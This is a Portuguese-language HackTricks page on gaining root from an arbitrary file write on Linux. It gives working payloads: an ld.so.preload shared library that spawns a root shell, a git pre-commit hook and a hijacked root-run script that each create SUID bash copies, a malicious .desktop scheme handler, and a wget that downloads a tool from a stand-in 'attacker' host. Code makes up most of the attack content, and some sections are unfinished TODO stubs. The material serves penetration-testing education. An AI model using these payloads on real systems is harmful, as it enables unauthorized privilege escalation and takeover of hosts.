# Escrita Arbitrária de Arquivo para root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Este arquivo funciona como a variável de ambiente **`LD_PRELOAD`**, mas também funciona em **SUID binaries**.\
Se você puder criá-lo ou modificá-lo, pode simplesmente adicionar um **caminho para uma biblioteca que será carregada** em cada binário executado.

Por exemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) são **scripts** que são **executados** em vários **eventos** em um repositório git, como quando um commit é criado, um merge... Então, se um **script ou usuário privilegiado** estiver realizando essas ações com frequência e for possível **write in the `.git` folder**, isso pode ser usado para **privesc**.

Por exemplo, é possível **generate a script** em um git repo em **`.git/hooks`** para que ele seja sempre executado quando um novo commit é criado:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & arquivos de tempo

TODO

### Arquivos de Serviço & Socket

TODO

### binfmt_misc

O arquivo localizado em `/proc/sys/fs/binfmt_misc` indica qual binário deve executar qual tipo de arquivos. TODO: verificar os requisitos para abusar disso e executar um rev shell quando um tipo comum de arquivo for aberto.

### Sobrescrever handlers de esquema (como http: ou https:)

Um atacante com permissões de escrita nos diretórios de configuração da vítima pode facilmente substituir ou criar arquivos que alterem o comportamento do sistema, resultando em execução de código não intencional. Ao modificar o arquivo `$HOME/.config/mimeapps.list` para apontar os manipuladores de URL HTTP e HTTPS para um arquivo malicioso (por exemplo, definindo `x-scheme-handler/http=evil.desktop`), o atacante garante que **clicar em qualquer link http ou https aciona o código especificado nesse arquivo `evil.desktop`**. Por exemplo, após colocar o seguinte código malicioso em `evil.desktop` em `$HOME/.local/share/applications`, qualquer clique em uma URL externa executa o comando embutido:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Para mais informações, veja [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) onde foi usado para explorar uma vulnerabilidade real.

### Root executando scripts/binários graváveis pelo usuário

Se um fluxo de trabalho privilegiado executa algo como `/bin/sh /home/username/.../script` (ou qualquer binário dentro de um diretório pertencente a um usuário não privilegiado), você pode sequestrá-lo:

- **Detectar a execução:** monitore processos com [pspy](https://github.com/DominicBreuker/pspy) para capturar root invocando caminhos controlados pelo usuário:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** certifique-se de que tanto o arquivo alvo quanto seu diretório pertencem ao seu usuário e são graváveis.
- **Hijack the target:** faça um backup do binário/script original e coloque uma payload que crie um shell SUID (ou qualquer outra ação como root), então restaure as permissões:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Acione a ação privilegiada** (por exemplo, pressionando um botão da UI que spawns the helper). Quando root re-executar o hijacked path, pegue o escalated shell com `./rootshell -p`.

## Referências

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)

{{#include ../../banners/hacktricks-training.md}}
